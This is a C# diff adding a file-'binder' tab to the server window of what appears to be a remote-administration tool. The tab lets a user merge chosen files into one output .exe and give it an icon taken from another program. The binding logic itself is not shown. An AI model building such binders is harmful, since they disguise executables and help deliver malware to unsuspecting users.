@@ -136,6 +136,8 @@ public partial class ServerWindow : Window
             // Always load cert hash
             try { BldCertHash.Text = Net.CertificateHelper.GetCertSha256Hash(); }
             catch { BldCertHash.Text = "(start server first)"; }
+
+            BinderGrid.ItemsSource = _binderEntries;
         };
     }
 
@@ -3649,6 +3651,10 @@ Read-Host 'Press Enter to close'
     private readonly Dictionary<string, System.Windows.Controls.Image> _screenTiles = new();
     private readonly HashSet<string> _screenHandlers = new();
 
+    // ── Binder ──────────────────────────────────────────────────────────
+    private readonly ObservableCollection<SeroServer.Binder.BinderEntry> _binderEntries = [];
+    private string? _binderIconPath;
+
     private void ScreenStart_Click(object sender, RoutedEventArgs e)
     {
         if (_server == null) return;
@@ -3783,6 +3789,113 @@ Read-Host 'Press Enter to close'
             });
         }
         catch { }
+    }
+
+    // ── Binder handlers ─────────────────────────────────────────────────
+
+    private void BtnBinderAdd_Click(object sender, RoutedEventArgs e)
+    {
+        var dlg = new Microsoft.Win32.OpenFileDialog
+        {
+            Title = "Ajouter des fichiers",
+            Filter = "Tous les fichiers (*.*)|*.*",
+            Multiselect = true
+        };
+        if (dlg.ShowDialog() != true) return;
+        foreach (var path in dlg.FileNames)
+        {
+            var icon = BinderGetIcon(path);
+            _binderEntries.Add(new SeroServer.Binder.BinderEntry
+            {
+                FilePath = path,
+                FileSize = new FileInfo(path).Length,
+                Icon     = icon
+            });
+        }
+    }
+
+    private void BtnBinderRemove_Click(object sender, RoutedEventArgs e)
+    {
+        if (BinderGrid.SelectedItem is SeroServer.Binder.BinderEntry entry)
+            _binderEntries.Remove(entry);
+    }
+
+    private void BtnBinderUp_Click(object sender, RoutedEventArgs e)
+    {
+        var idx = BinderGrid.SelectedIndex;
+        if (idx > 0) _binderEntries.Move(idx, idx - 1);
+    }
+
+    private void BtnBinderDown_Click(object sender, RoutedEventArgs e)
+    {
+        var idx = BinderGrid.SelectedIndex;
+        if (idx >= 0 && idx < _binderEntries.Count - 1) _binderEntries.Move(idx, idx + 1);
+    }
+
+    private void BtnBinderSelectIcon_Click(object sender, RoutedEventArgs e)
+    {
+        var dlg = new Microsoft.Win32.OpenFileDialog
+        {
+            Title  = "Source de l'icône",
+            Filter = "Icône / Exécutable (*.ico;*.exe;*.dll)|*.ico;*.exe;*.dll|Tous (*.*)|*.*"
+        };
+        if (dlg.ShowDialog() != true) return;
+        _binderIconPath = dlg.FileName;
+        BinderIconPreview.Source = BinderGetIcon(_binderIconPath);
+    }
+
+    private void BtnBinderClearIcon_Click(object sender, RoutedEventArgs e)
+    {
+        _binderIconPath = null;
+        BinderIconPreview.Source = null;
+    }
+
+    private void BtnBinderBrowseOutput_Click(object sender, RoutedEventArgs e)
+    {
+        var dlg = new Microsoft.Win32.SaveFileDialog
+        {
+            Title       = "Enregistrer le binder",
+            Filter      = "Exécutable (*.exe)|*.exe",
+            DefaultExt  = ".exe",
+            FileName    = "output.exe"
+        };
+        if (dlg.ShowDialog() == true) TxtBinderOutput.Text = dlg.FileName;
+    }
+
+    private async void BtnBinderBuild_Click(object sender, RoutedEventArgs e)
+    {
+        if (_binderEntries.Count == 0) { TxtBinderStatus.Text = "Aucun fichier."; return; }
+        var output = TxtBinderOutput.Text.Trim();
+        if (string.IsNullOrEmpty(output)) { TxtBinderStatus.Text = "Chemin de sortie manquant."; return; }
+
+        BtnBinderBuild.IsEnabled = false;
+        TxtBinderStatus.Text = "Compilation…";
+
+        var entries = _binderEntries.ToList();
+        var icon    = _binderIconPath;
+        var result  = await SeroServer.Binder.BinderBuilder.Build(
+            entries, icon, output,
+            msg => Dispatcher.BeginInvoke(() => TxtBinderStatus.Text = msg));
+
+        BtnBinderBuild.IsEnabled = true;
+        TxtBinderStatus.Text = result == "OK"
+            ? $"✓ Compilé → {Path.GetFileName(output)}"
+            : result;
+    }
+
+    private static System.Windows.Media.Imaging.BitmapSource? BinderGetIcon(string path)
+    {
+        try
+        {
+            using var icon = System.Drawing.Icon.ExtractAssociatedIcon(path);
+            if (icon == null) return null;
+            var bmp = System.Windows.Interop.Imaging.CreateBitmapSourceFromHIcon(
+                icon.Handle, System.Windows.Int32Rect.Empty,
+                System.Windows.Media.Imaging.BitmapSizeOptions.FromEmptyOptions());
+            bmp.Freeze();
+            return bmp;
+        }
+        catch { return null; }
     }
 
     private void Close_Click(object sender, RoutedEventArgs e)
